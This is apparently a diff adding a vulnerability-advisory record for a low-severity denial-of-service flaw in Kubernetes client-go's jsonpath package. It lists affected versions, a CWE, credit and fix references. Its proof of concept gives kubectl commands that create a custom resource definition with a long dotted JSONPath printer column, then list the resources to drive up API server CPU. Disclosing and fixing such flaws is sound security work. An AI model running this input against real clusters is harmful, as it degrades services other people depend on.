@@ -1,0 +1,75 @@
+---
+- id: snykio:go:k8s.io/kubernetes/staging/src/k8s.io/client-go/util/jsonpath:597671
+  title: Denial of Service (DoS)
+  description: |
+    [k8s.io/kubernetes/staging/src/k8s.io/client-go/util/jsonpath][1] is an
+    is a template engine using jsonpath syntax, which can be seen at
+    [http://goessner.net/articles/JsonPath/][2]. In addition, it has
+    \{range} \{end} function to iterate list and slice.
+
+    Affected versions of this package are vulnerable to Denial of Service
+    (DoS). A user able to create CRDs could create a malicious CRD such that
+    listing CRs will cause enormous amounts of CPU usage on the API server.
+
+    ### PoC   {#poc}
+
+    1)
+
+        kubectl create -f - <<EOF
+        apiVersion: apiextensions.k8s.io/v1beta1
+        kind: CustomResourceDefinition
+        metadata:
+          name: foos.example.com
+        spec:
+          group: example.com
+          scope: Namespaced
+          names:
+            plural: foos
+            singular: foo
+            kind: Foo
+          version: v1
+          additionalPrinterColumns:
+          - name: FOO
+            type: string
+            JSONPath: ........................................................................................................................................................................................................
+        EOF
+
+    2)
+
+        kubectl create -f - <<EOF
+        apiVersion: example.com/v1
+        kind: Foo
+        metadata:
+          name: foo-cr
+        spec:
+          foo:
+            bar:
+              baz:
+                qux: data
+        EOF
+
+    3) `kubectl get foo`
+
+    The API server CPU usage significantly increases
+
+
+
+    [1]: https://godoc.org/k8s.io/client-go/util/jsonpath
+    [2]: http://goessner.net/articles/JsonPath/
+  affected_package: k8s.io/kubernetes/staging/src/k8s.io/client-go/util/jsonpath
+  vulnerable_versions:
+  - "<1.19.0-rc.4"
+  severity: low
+  package_manager: go
+  cwe:
+  - CWE-400
+  disclosed_date: 2020-07-24
+  created_date: 2020-07-24
+  last_modified_date: 2020-07-24
+  credit:
+  - lazydog
+  references:
+  - https://github.com/kubernetes/kubernetes/issues/93400
+  - https://github.com/kubernetes/kubernetes/pull/93408
+  - https://github.com/kubernetes/kubernetes/pull/93408/commits/8c702254938c40a48b2e3db78fcc944ca50fdc65
+  source_url: https://snyk.io/vuln/SNYK-GOLANG-K8SIOKUBERNETESSTAGINGSRCK8SIOCLIENTGOUTILJSONPATH-597671
